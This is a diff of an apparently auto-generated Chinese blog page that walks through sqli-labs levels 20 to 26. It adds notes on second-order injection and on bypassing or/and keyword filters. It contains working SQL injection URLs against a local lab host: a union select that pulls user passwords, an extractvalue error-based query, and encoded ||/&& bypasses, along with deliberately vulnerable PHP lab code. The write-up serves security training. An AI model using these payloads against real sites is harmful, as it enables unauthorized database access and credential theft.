+                        <span class="token keyword">echo</span> <span class="token string">"&lt;br>&lt;/font>"</span><span class="token punctuation">;</span>
                         <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE username='$cookee' LIMIT 0,1"</span><span class="token punctuation">;</span>
                         <span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$result</span><span class="token punctuation">)</span>
@@ -1890,45 +1890,45 @@ echo 'Your Referer is: ' .$uagent;<span aria-hidden="true" class="line-numbers-r
                         <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                         <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span>
                                 <span class="token punctuation">{</span>
-                                <span class="token keyword">echo</span> <span class="token string">'&lt;font color= "pink" font size="5"&gt;'</span><span class="token punctuation">;</span>
+                                <span class="token keyword">echo</span> <span class="token string">'&lt;font color= "pink" font size="5">'</span><span class="token punctuation">;</span>
                                 <span class="token keyword">echo</span> <span class="token string">'Your Login name:'</span><span class="token punctuation">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-                                <span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span>
-                                <span class="token keyword">echo</span> <span class="token string">'&lt;font color= "grey" font size="5"&gt;'</span><span class="token punctuation">;</span>  
+                                <span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>
+                                <span class="token keyword">echo</span> <span class="token string">'&lt;font color= "grey" font size="5">'</span><span class="token punctuation">;</span>  
                                 <span class="token keyword">echo</span> <span class="token string">'Your Password:'</span> <span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-                                <span class="token keyword">echo</span> <span class="token string">"&lt;/font&gt;&lt;/b&gt;"</span><span class="token punctuation">;</span>
-                                <span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span>
+                                <span class="token keyword">echo</span> <span class="token string">"&lt;/font>&lt;/b>"</span><span class="token punctuation">;</span>
+                                <span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>
                                 <span class="token keyword">echo</span> <span class="token string">'Your ID:'</span> <span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
                                 <span class="token punctuation">}</span>
                         <span class="token keyword">else</span>
                                 <span class="token punctuation">{</span>
-                                <span class="token keyword">echo</span> <span class="token string">"&lt;center&gt;"</span><span class="token punctuation">;</span>
-                                <span class="token keyword">echo</span> <span class="token string">'&lt;br&gt;&lt;br&gt;&lt;br&gt;'</span><span class="token punctuation">;</span>
-                                <span class="token keyword">echo</span> <span class="token string">'&lt;img src="../images/slap1.jpg" /&gt;'</span><span class="token punctuation">;</span>
-                                <span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;&lt;br&gt;&lt;b&gt;"</span><span class="token punctuation">;</span>
-                                <span class="token comment" spellcheck="true">//echo '&lt;img src="../images/Less-20.jpg" /&gt;';</span>
+                                <span class="token keyword">echo</span> <span class="token string">"&lt;center>"</span><span class="token punctuation">;</span>
+                                <span class="token keyword">echo</span> <span class="token string">'&lt;br>&lt;br>&lt;br>'</span><span class="token punctuation">;</span>
+                                <span class="token keyword">echo</span> <span class="token string">'&lt;img src="../images/slap1.jpg" />'</span><span class="token punctuation">;</span>
+                                <span class="token keyword">echo</span> <span class="token string">"&lt;br>&lt;br>&lt;b>"</span><span class="token punctuation">;</span>
+                                <span class="token comment" spellcheck="true">//echo '&lt;img src="../images/Less-20.jpg" />';</span>
                                 <span class="token punctuation">}</span>
-                        <span class="token keyword">echo</span> <span class="token string">'&lt;center&gt;'</span><span class="token punctuation">;</span>
-                        <span class="token keyword">echo</span> <span class="token string">'&lt;form action="" method="post"&gt;'</span><span class="token punctuation">;</span>
-                        <span class="token keyword">echo</span> <span class="token string">'&lt;input  type="submit" name="submit" value="Delete Your Cookie!" /&gt;'</span><span class="token punctuation">;</span>
-                        <span class="token keyword">echo</span> <span class="token string">'&lt;/form&gt;'</span><span class="token punctuation">;</span>
-                        <span class="token keyword">echo</span> <span class="token string">'&lt;/center&gt;'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+                        <span class="token keyword">echo</span> <span class="token string">'&lt;center>'</span><span class="token punctuation">;</span>
+                        <span class="token keyword">echo</span> <span class="token string">'&lt;form action="" method="post">'</span><span class="token punctuation">;</span>
+                        <span class="token keyword">echo</span> <span class="token string">'&lt;input  type="submit" name="submit" value="Delete Your Cookie!" />'</span><span class="token punctuation">;</span>
+                        <span class="token keyword">echo</span> <span class="token string">'&lt;/form>'</span><span class="token punctuation">;</span>
+                        <span class="token keyword">echo</span> <span class="token string">'&lt;/center>'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <ol start="4">
 <li><strong>第二种情况，你按了删除cookie的按钮,后台就把cookie的时间设置为过期的时间，那么cookie就被删除了</strong></li>
 </ol>
 <pre class="line-numbers language-php"><code class="language-php">        <span class="token keyword">else</span>
                 <span class="token punctuation">{</span>
-                <span class="token keyword">echo</span> <span class="token string">'&lt;center&gt;'</span><span class="token punctuation">;</span>
-                <span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span>
-                <span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span>
-                <span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span>
-                <span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span>
-                <span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span>
-                <span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span>
-                <span class="token keyword">echo</span> <span class="token string">'&lt;font color= "#FFFF00" font size = 6 &gt;'</span><span class="token punctuation">;</span>
+                <span class="token keyword">echo</span> <span class="token string">'&lt;center>'</span><span class="token punctuation">;</span>
+                <span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>
+                <span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>
+                <span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>
+                <span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>
+                <span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>
+                <span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>
+                <span class="token keyword">echo</span> <span class="token string">'&lt;font color= "#FFFF00" font size = 6 >'</span><span class="token punctuation">;</span>
                 <span class="token keyword">echo</span> <span class="token string">" Your Cookie is deleted"</span><span class="token punctuation">;</span>
                                 <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">'uname'</span><span class="token punctuation">,</span> <span class="token variable">$row1</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">3600</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                                 <span class="token function">header</span> <span class="token punctuation">(</span><span class="token string">'Location: index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-                <span class="token keyword">echo</span> <span class="token string">'&lt;/font&gt;&lt;/center&gt;&lt;/br&gt;'</span><span class="token punctuation">;</span>
+                <span class="token keyword">echo</span> <span class="token string">'&lt;/font>&lt;/center>&lt;/br>'</span><span class="token punctuation">;</span>
 
                 <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <ol start="5">
@@ -2076,6 +2076,66 @@ base64：LWFkbWluIiAgVU5JT04gU0VMRUNUIDEsZ3JvdXBfY29uY2F0KHVzZXJuYW1lKSxncm91cF9
 <pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-23/?id=-1' union select 1,(select group_concat(password) FROM security.users),3'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>注：这一关还可以使用  extractvalue() 和 UpdateXml() 函数进行报错注入，使用延时注入。</p>
 <p><img src="https://i.loli.net/2020/02/10/hIxtvPBi7kLepMV.png" alt="less23-7.png"></p>
+<h2 id="Less-24"><a href="#Less-24" class="headerlink" title="Less 24"></a>Less 24</h2><p>二次注入之存储注入</p>
+<hr>
+<h3 id="基础知识-7"><a href="#基础知识-7" class="headerlink" title="基础知识"></a>基础知识</h3><h4 id="什么是二次注入"><a href="#什么是二次注入" class="headerlink" title="什么是二次注入"></a>什么是二次注入</h4><p>所谓的二次注入是指，读取已经存储到数据库的用户输入，然后再将该输入带到 sql 语句中执行。<br>二次注入是 sql 注入的一种，但是比普通 sql 注入利用更加困难，利用门槛更高。普通注入数据直接进入到 SQL 查询中，而二次注入则是输入数据经处理后存储，取出后，再次进入到 SQL 查询。相对于一次注入漏洞而言，二次注入漏洞更难以被发现，但是它却具有与一次注入攻击漏洞相同的攻击威力。</p>
+<h4 id="二次注入原理"><a href="#二次注入原理" class="headerlink" title="二次注入原理"></a>二次注入原理</h4><p>二次注入的原理，在第一次进行数据库插入数据的时候，仅仅只是使用了 addslashes 函数或者是借助 get_magic_quotes_gpc 对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身还是脏数据。<br>在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。比如在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在拼凑的过程中，就形成了二次注入。</p>
+<p><img src="https://image.3001.net/images/20180331/15224810526050.png" alt=" "></p>
+<h3 id="注入步骤-10"><a href="#注入步骤-10" class="headerlink" title="注入步骤"></a>注入步骤</h3><ol>
+<li><strong>注册一个新用户</strong></li>
+</ol>
+<p><img src="https://i.loli.net/2020/02/13/qy3Eh5Soa4A7sPm.png" alt="less24-1.png"></p>
+<p><img src="https://i.loli.net/2020/02/13/h6J4BGTxUZLwYMF.png" alt="less24-2.png"></p>
+<p><img src="https://i.loli.net/2020/02/13/ZdNzFtG1cWn4BHp.png" alt="less24-3.png"></p>
+<ol start="2">
+<li><strong>登录用户，修改密码</strong></li>
+</ol>
+<p><img src="https://i.loli.net/2020/02/13/eYcD23jvAwyE1Na.png" alt="less24-4.png"></p>
+<ol start="3">
+<li><strong>再次查看数据库</strong></li>
+</ol>
+<p><img src="https://i.loli.net/2020/02/13/3p4TOzHWmgb2RZE.png" alt="less24-5.png"></p>
+<h2 id="Less25"><a href="#Less25" class="headerlink" title="Less25"></a>Less25</h2><p>报错注入，过滤了 or 和 and</p>
+<hr>
+<h3 id="基础知识-8"><a href="#基础知识-8" class="headerlink" title="基础知识"></a>基础知识</h3><h4 id="绕过-or-和-and-过滤有如下几种方法："><a href="#绕过-or-和-and-过滤有如下几种方法：" class="headerlink" title="绕过 or 和 and 过滤有如下几种方法："></a>绕过 or 和 and 过滤有如下几种方法：</h4><ul>
+<li>大小写变型</li>
+<li>编码，hex，urlencode</li>
+<li>添加注释：/<em>or</em>/</li>
+<li>利用符号: and=&amp;&amp; or=||</li>
+</ul>
+<p>注：在 url 中字符 “&amp;” 表示参数分隔符，所以在注入过程中要将 “&amp;&amp;” 进行 urlencode</p>
+<h3 id="注入步骤-11"><a href="#注入步骤-11" class="headerlink" title="注入步骤"></a>注入步骤</h3><ol>
+<li><strong>测试 or 和 and 大小写</strong></li>
+</ol>
+<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-25/?id=1' Or 1=1%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-25/?id=1' AnD 1=1%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://i.loli.net/2020/02/14/GNLw5WRJ41iTUfc.png" alt="less25-1.png"></p>
+<ol start="2">
+<li><strong>测试符号 &amp;&amp; 和 ||</strong></li>
+</ol>
+<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-25/?id=1' || 1=1%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://i.loli.net/2020/02/14/uzSleZgCJGcODjL.png" alt="less25-2.png"></p>
+<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-25/?id=1' %26%26 1=1%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://i.loli.net/2020/02/14/qDHv49jOicGB1N5.png" alt="less25-3.png"></p>
+<ol start="3">
+<li><strong>报错注入</strong></li>
+</ol>
+<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-25/?id=1' %26%26 extractvalue(1,concat(0x7e,database()))%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://i.loli.net/2020/02/14/N5aOTmXZ1jzCHrp.png" alt="less25-4.png"></p>
+<h2 id="Less25a"><a href="#Less25a" class="headerlink" title="Less25a"></a>Less25a</h2><p>这一关同样是过滤了 or 和 and，同时没有输出错误项。所以这一关可直接使用联合注入和延时注入。</p>
+<hr>
+<ol>
+<li><strong>联合注入</strong></li>
+</ol>
+<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-25a/?id=-1 union select 1,database(),3%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://i.loli.net/2020/02/16/Gd9NxZEMp1XvBzO.png" alt="less25a-1.png"></p>
+<ol start="2">
+<li><strong>or 和 and 利用</strong></li>
+</ol>
+<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-25a/?id=-1 || 1=1%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://i.loli.net/2020/02/16/my3EGUOpKXgxoWh.png" alt="less25a-2.png"></p>
+<h2 id="Less26"><a href="#Less26" class="headerlink" title="Less26"></a>Less26</h2><p>基于错误_GET_过滤空格/注释_单引号_字符型注入</p>
+<hr>
 <h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><hr>
 <h3 id="Less1-1"><a href="#Less1-1" class="headerlink" title="Less1"></a>Less1</h3><p><a href="https://www.cnblogs.com/omnis/p/8311556.html" target="_blank" rel="noopener">【sqli-labs】 less1 GET - Error based - Single quotes - String(GET型基于错误的单引号字符型注入)</a></p>
 <p><a href="https://blog.csdn.net/sdb5858874/article/details/80656123" target="_blank" rel="noopener">SQL注入——联合查询和报错注入</a></p>
@@ -2117,6 +2177,10 @@ base64：LWFkbWluIiAgVU5JT04gU0VMRUNUIDEsZ3JvdXBfY29uY2F0KHVzZXJuYW1lKSxncm91cF9
 <p><a href="https://zhzhdoai.github.io/2018/12/22/sqlilabs23-28/" target="_blank" rel="noopener">sqlilabs23-28</a></p>
 <p><a href="https://blog.csdn.net/qq_21500173/article/details/51964908" target="_blank" rel="noopener">Less - 23 Error Based- no comments</a></p>
 <p><a href="https://blog.csdn.net/Fly_hps/article/details/80285353" target="_blank" rel="noopener">sqli-labs————less 23（高级注入篇）</a></p>
+<h3 id="Less24"><a href="#Less24" class="headerlink" title="Less24"></a>Less24</h3><p><a href="https://www.freebuf.com/articles/web/167089.html" target="_blank" rel="noopener">由Three Hit聊聊二次注入</a></p>
+<p><a href="https://zhuanlan.zhihu.com/p/39917830" target="_blank" rel="noopener">SQL注入（二次注入）</a></p>
+<h3 id="Less25-1"><a href="#Less25-1" class="headerlink" title="Less25"></a>Less25</h3><p><a href="https://www.cnblogs.com/julin-peng/p/4237791.html" target="_blank" rel="noopener">URL中“#” “？” &amp;“”号的作用</a></p>
+<p><a href="https://www.jianshu.com/p/0e285c2bbfba" target="_blank" rel="noopener">sql-labs less25 or and 过滤</a></p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -2390,7 +2454,7 @@ base64：LWFkbWluIiAgVU5JT04gU0VMRUNUIDEsZ3JvdXBfY29uY2F0KHVzZXJuYW1lKSxncm91cF9
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">61.4k</span>&nbsp;字
+                class="white-color">61.7k</span>&nbsp;字
                
             
 			
